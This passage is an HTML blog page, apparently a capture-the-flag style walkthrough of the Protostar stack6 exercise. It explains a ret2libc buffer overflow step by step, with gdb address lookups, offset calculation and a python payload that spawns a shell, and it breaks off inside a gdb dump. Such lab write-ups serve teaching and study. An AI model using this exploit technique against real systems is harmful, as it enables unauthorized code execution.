@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="Here is the source of the vulnerable program : 12345678910111213141516171819202122232425262728293031#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;v">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Protostar vm, stack6">
+<meta property="og:url" content="http://slayne.github.io/2016/02/16/stack6/index.html">
+<meta property="og:site_name" content="The Hacker Apprentice">
+<meta property="og:description" content="Here is the source of the vulnerable program : 12345678910111213141516171819202122232425262728293031#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;v">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-05-19T14:09:09.661Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Protostar vm, stack6">
+<meta name="twitter:description" content="Here is the source of the vulnerable program : 12345678910111213141516171819202122232425262728293031#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;v">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Protostar vm, stack6</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2016/02/17/stack7/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2016/02/03/stack5/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://slayne.github.io/2016/02/16/stack6/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://slayne.github.io/2016/02/16/stack6/&text=Protostar vm, stack6"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://slayne.github.io/2016/02/16/stack6/&title=Protostar vm, stack6"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://slayne.github.io/2016/02/16/stack6/&is_video=false&description=Protostar vm, stack6"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Protostar vm, stack6&body=Check out this article: http://slayne.github.io/2016/02/16/stack6/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://slayne.github.io/2016/02/16/stack6/&title=Protostar vm, stack6"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://slayne.github.io/2016/02/16/stack6/&title=Protostar vm, stack6"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://slayne.github.io/2016/02/16/stack6/&title=Protostar vm, stack6"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://slayne.github.io/2016/02/16/stack6/&title=Protostar vm, stack6"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://slayne.github.io/2016/02/16/stack6/&name=Protostar vm, stack6&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Protostar vm, stack6
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">The Hacker Apprentice</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2016-02-15T23:00:00.000Z" itemprop="datePublished">16-02-2016</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/protostar/">protostar</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>Here is the source of the vulnerable program :</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getpath</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input path please: "</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  ret = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((ret &amp; <span class="number">0xbf000000</span>) == <span class="number">0xbf000000</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"bzzzt (%p)\n"</span>, ret);</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"got path %s\n"</span>, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  getpath();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>In this challenge we’ll have to try a new attack : ret2libc</p>
+<p>Instead of putting shellcode in the buffer, we’ll try to call a particular libc function : system(). </p>
+<p>Thanks to it we should be able to spawn a shell.</p>
+<p>In order to perform this attack we need several things. First, we have to call this function somewhere on the stack in order to get its address.</p>
+<p>A simple method is to compile a dummy program in C that ccalls the function and then look with gdb.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:~$ <span class="built_in">echo</span> <span class="string">'int main() &#123; system(); &#125;'</span> &gt; sys.c</span><br><span class="line">user@protostar:~$ cat sys.c </span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123; system(); &#125;</span><br><span class="line">user@protostar:~$ gcc sys.c -o sys</span><br><span class="line">user@protostar:~$ gdb -q sys</span><br><span class="line">Reading symbols from /home/user/sys...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint 1 at 0x80483c7</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/user/sys </span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080483c7 <span class="keyword">in</span> main ()</span><br><span class="line">(gdb) p system</span><br><span class="line"><span class="variable">$1</span> = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7ecffb0 &lt;__libc_system&gt;</span><br><span class="line">(gdb) p <span class="built_in">exit</span></span><br><span class="line"><span class="variable">$2</span> = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7ec60c0 &lt;*__GI_exit&gt;</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+<p>Note that we also grabbed exit()’s address, we’ll see later what for.</p>
+<p>Now we have to put the string “/bin/sh” (the argument we’ll use for our system() call) somewhere in the stack and grab it’s address.</p>
+<p>A way of doing that is tu put “/bin/sh” in an environment variable and then getting it’s address with a simple C program.</p>
+<p>Here is the code :</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *addr_var;</span><br><span class="line">addr_var = getenv(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s is stored at address %p\n"</span>, argv[<span class="number">1</span>], addr_var);</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">And here is how I used it :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">``` bash </span><br><span class="line">user@protostar:~$ <span class="keyword">export</span> HACK=/bin/sh</span><br><span class="line">user@protostar:~$ echo $HACK</span><br><span class="line">/bin/sh</span><br><span class="line">user@protostar:~$ ./var HACK</span><br><span class="line">HACK is stored at address <span class="number">0xbffff9c7</span></span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">Just to recap :</span><br><span class="line">We have the adresses of <span class="built_in">exit</span>(), system() <span class="keyword">and</span> <span class="string">"/bin/sh"</span>. We now need the offset of the %eip <span class="keyword">register</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">``` bash </span><br><span class="line">user@protostar:~$ gdb -q /opt/protostar/bin/./stack6</span><br><span class="line">Reading symbols from /opt/protostar/bin/stack6...done.</span><br><span class="line">(gdb) disass getpath</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function getpath:</span><br><span class="line"><span class="number">0x08048484</span> &lt;getpath+<span class="number">0</span>&gt;:	push   %ebp</span><br><span class="line"><span class="number">0x08048485</span> &lt;getpath+<span class="number">1</span>&gt;:	mov    %esp,%ebp</span><br><span class="line"><span class="number">0x08048487</span> &lt;getpath+<span class="number">3</span>&gt;:	sub    $<span class="number">0x68</span>,%esp</span><br><span class="line"><span class="number">0x0804848a</span> &lt;getpath+<span class="number">6</span>&gt;:	mov    $<span class="number">0x80485d0</span>,%eax</span><br><span class="line"><span class="number">0x0804848f</span> &lt;getpath+<span class="number">11</span>&gt;:	mov    %eax,(%esp)</span><br><span class="line"><span class="number">0x08048492</span> &lt;getpath+<span class="number">14</span>&gt;:	call   <span class="number">0x80483c0</span> &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line"><span class="number">0x08048497</span> &lt;getpath+<span class="number">19</span>&gt;:	mov    <span class="number">0x8049720</span>,%eax</span><br><span class="line"><span class="number">0x0804849c</span> &lt;getpath+<span class="number">24</span>&gt;:	mov    %eax,(%esp)</span><br><span class="line"><span class="number">0x0804849f</span> &lt;getpath+<span class="number">27</span>&gt;:	call   <span class="number">0x80483b0</span> &lt;fflush@plt&gt;</span><br><span class="line"><span class="number">0x080484a4</span> &lt;getpath+<span class="number">32</span>&gt;:	lea    <span class="number">-0x4c</span>(%ebp),%eax</span><br><span class="line"><span class="number">0x080484a7</span> &lt;getpath+<span class="number">35</span>&gt;:	mov    %eax,(%esp)</span><br><span class="line"><span class="number">0x080484aa</span> &lt;getpath+<span class="number">38</span>&gt;:	call   <span class="number">0x8048380</span> &lt;gets@plt&gt;</span><br><span class="line"><span class="number">0x080484af</span> &lt;getpath+<span class="number">43</span>&gt;:	mov    <span class="number">0x4</span>(%ebp),%eax</span><br><span class="line"><span class="number">0x080484b2</span> &lt;getpath+<span class="number">46</span>&gt;:	mov    %eax,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"><span class="number">0x080484b5</span> &lt;getpath+<span class="number">49</span>&gt;:	mov    <span class="number">-0xc</span>(%ebp),%eax</span><br><span class="line"><span class="number">0x080484b8</span> &lt;getpath+<span class="number">52</span>&gt;:	<span class="keyword">and</span>    $<span class="number">0xbf000000</span>,%eax</span><br><span class="line"><span class="number">0x080484bd</span> &lt;getpath+<span class="number">57</span>&gt;:	cmp    $<span class="number">0xbf000000</span>,%eax</span><br><span class="line"><span class="number">0x080484c2</span> &lt;getpath+<span class="number">62</span>&gt;:	jne    <span class="number">0x80484e4</span> &lt;getpath+<span class="number">96</span>&gt;</span><br><span class="line"><span class="number">0x080484c4</span> &lt;getpath+<span class="number">64</span>&gt;:	mov    $<span class="number">0x80485e4</span>,%eax</span><br><span class="line"><span class="number">0x080484c9</span> &lt;getpath+<span class="number">69</span>&gt;:	mov    <span class="number">-0xc</span>(%ebp),%edx</span><br><span class="line"><span class="number">0x080484cc</span> &lt;getpath+<span class="number">72</span>&gt;:	mov    %edx,<span class="number">0x4</span>(%esp)</span><br><span class="line"><span class="number">0x080484d0</span> &lt;getpath+<span class="number">76</span>&gt;:	mov    %eax,(%esp)</span><br><span class="line"><span class="number">0x080484d3</span> &lt;getpath+<span class="number">79</span>&gt;:	call   <span class="number">0x80483c0</span> &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line"><span class="number">0x080484d8</span> &lt;getpath+<span class="number">84</span>&gt;:	movl   $<span class="number">0x1</span>,(%esp)</span><br><span class="line"><span class="number">0x080484df</span> &lt;getpath+<span class="number">91</span>&gt;:	call   <span class="number">0x80483a0</span> &lt;_exit@plt&gt;</span><br><span class="line"><span class="number">0x080484e4</span> &lt;getpath+<span class="number">96</span>&gt;:	mov    $<span class="number">0x80485f0</span>,%eax</span><br><span class="line"><span class="number">0x080484e9</span> &lt;getpath+<span class="number">101</span>&gt;:	lea    <span class="number">-0x4c</span>(%ebp),%edx</span><br><span class="line"><span class="number">0x080484ec</span> &lt;getpath+<span class="number">104</span>&gt;:	mov    %edx,<span class="number">0x4</span>(%esp)</span><br><span class="line"><span class="number">0x080484f0</span> &lt;getpath+<span class="number">108</span>&gt;:	mov    %eax,(%esp)</span><br><span class="line"><span class="number">0x080484f3</span> &lt;getpath+<span class="number">111</span>&gt;:	call   <span class="number">0x80483c0</span> &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line"><span class="number">0x080484f8</span> &lt;getpath+<span class="number">116</span>&gt;:	leave  </span><br><span class="line"><span class="number">0x080484f9</span> &lt;getpath+<span class="number">117</span>&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) b *getpath+<span class="number">49</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x80484b5</span>: file stack6/stack6.c, line <span class="number">17.</span></span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /opt/protostar/bin/stack6 </span><br><span class="line">input path please: AAAAAAAAA</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, getpath () at stack6/stack6.c:<span class="number">17</span></span><br><span class="line"><span class="number">17</span>	stack6/stack6.c: No such file <span class="keyword">or</span> directory.</span><br><span class="line">	in stack6/stack6.c</span><br><span class="line">(gdb) x/<span class="number">30</span>x $esp</span><br><span class="line"><span class="number">0xbffff730</span>:	<span class="number">0xbffff74c</span>	<span class="number">0x00000000</span>	<span class="number">0xb7fe1b28</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xbffff740</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000001</span>	<span class="number">0xb7fff8f8</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="number">0xbffff750</span>:	<span class="number">0x41414141</span>	<span class="number">0xb7ec0041</span>	<span class="number">0xbffff768</span>	<span class="number">0xb7eada75</span></span><br><span class="line"><span class="number">0xbffff760</span>:	<span class="number">0xb7fd7ff4</span>	<span class="number">0x080496ec</span>	<span class="number">0xbffff778</span>	<span class="number">0x0804835c</span></span><br><span class="line"><span class="number">0xbffff770</span>:	<span class="number">0xb7ff1040</span>	<span class="number">0x080496ec</span>	<span class="number">0xbffff7a8</span>	<span class="number">0x08048539</span></span><br><span class="line"><span class="number">0xbffff780</span>:	<span class="number">0xb7fd8304</span>	<span class="number">0xb7fd7ff4</span>	<span class="number">0x08048520</span>	<span class="number">0x08048505</span></span><br><span class="line"><span class="number">0xbffff790</span>:	<span class="number">0xb7ec6365</span>	<span class="number">0xb7ff1040</span>	<span class="number">0xbffff7a8</span>	<span class="number">0x08048505</span></span><br><span class="line"><span class="number">0xbffff7a0</span>:	<span class="number">0x08048520</span>	<span class="number">0x00000000</span></span><br><span class="line">(gdb) p $ebp +<span class="number">0x4</span> <span class="number">-0xbffff74c</span></span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">void</span> *) <span class="number">0x50</span></span><br><span class="line">(gdb) p <span class="number">0x50</span></span><br><span class="line">$<span class="number">2</span> = <span class="number">80</span></span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">%eip is located <span class="number">80</span> bytes after the top of the <span class="built_in">stack</span>.</span><br><span class="line"></span><br><span class="line">We can now construct our payload which will look like that :</span><br><span class="line"></span><br><span class="line">padding + adress of system + address of <span class="built_in">exit</span> + address of <span class="string">"/bin/sh"</span></span><br><span class="line"></span><br><span class="line">The reason I put the address of <span class="built_in">exit</span> in the payload is because when returning from system, the next instruction executed will be that one <span class="keyword">and</span> so the program will close properly. </span><br><span class="line"></span><br><span class="line">Let's construct the payload <span class="keyword">and</span> test it :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">``` bash</span><br><span class="line">user@protostar:~$ python -c 'print 80*"A"+"\xb0\xff\xec\xb7"+"\xc0\x60\xec\xb7"+"\xcc\xf9\xff\xbf"' &gt; payload</span><br><span class="line">user@protostar:~$ cat payload -| /opt/protostar/bin/./stack6</span><br><span class="line">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`������</span><br><span class="line">sh: <span class="number">2.2</span>: <span class="keyword">not</span> found</span><br><span class="line"></span><br><span class="line">user@protostar:~$</span><br></pre></td></tr></table></figure>
+<p>A few things to note here, first I use “cat -“ in order to redirect the result from the cat command to stdin. I also added 5 bytes to the address of HACK in order for it to point to “/bin/sh” and not “HACK=/bin/sh”.<br>Finally, it doesn’t work, I noticed that the address I was getting for my environment variable was not the exact right one.<br>There actually is a shift. To find the right address I used gdb (probably not the best way)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:~$ gdb -q /opt/protostar/bin/./stack6</span><br><span class="line">Reading symbols from /opt/protostar/bin/stack6...done.</span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /opt/protostar/bin/stack6 </span><br><span class="line"></span><br><span class="line">Breakpoint 1, main (argc=1, argv=0xbffff854) at stack6/stack6.c:27</span><br><span class="line">27	stack6/stack6.c: No such file or directory.</span><br><span class="line">	<span class="keyword">in</span> stack6/stack6.c</span><br><span class="line">(gdb) x/20s 0xbffff9cc</span><br><span class="line">0xbffff9cc:	 <span class="string">""</span></span><br><span class="line">0xbffff9cd:	 <span class="string">"SHLVL=1"</span></span><br><span class="line">0xbffff9d5:	 <span class="string">"HOME=/home/user"</span></span><br><span class="line">0xbffff9e5:	 <span class="string">"OLDPWD=/opt/protostar/bin"</span></span><br><span class="line">0xbffff9ff:	 <span class="string">"SSH_TTY=/dev/pts/0"</span></span><br><span class="line">0xbffffa12:	 <span class="string">"LOGNAME=user"</span></span><br><span class="line">0xbffffa1f:	 <span class="string">"_=/usr/bin/gdb"</span></span><br><span class="line">0xbffffa2e:	 <span class="string">"COLUMNS=213"</span></span><br><span class="line">0xbffffa3a:	 <span class="string">"TERM=xterm"</span></span><br><span class="line">0xbffffa45:	 <span class="string">"PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"</span></span><br><span class="line">0xbffffa83:	 <span class="string">"LANG=en_US.UTF-8"</span></span><br><span class="line">0xbffffa94:	 <span class="string">"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"</span>...</span><br><span class="line">0xbffffb5c:	 <span class="string">":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"</span>...</span><br><span class="line">0xbffffc24:	 <span class="string">"eb=01;31:*.rpm=01;31:*.jar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35"</span>...</span><br><span class="line">0xbffffcec:	 <span class="string">":*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.ogm=01;35:*.mp4=01;35:*.m4"</span>...</span><br><span class="line">0xbffffdb4:	 <span class="string">"v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*."</span>...</span><br><span class="line">0xbffffe7c:	 <span class="string">"yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;3"</span>...</span><br><span class="line">0xbfffff44:	 <span class="string">"6:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"</span></span><br><span class="line">0xbfffff84:	 <span class="string">"SHELL=/bin/sh"</span></span><br><span 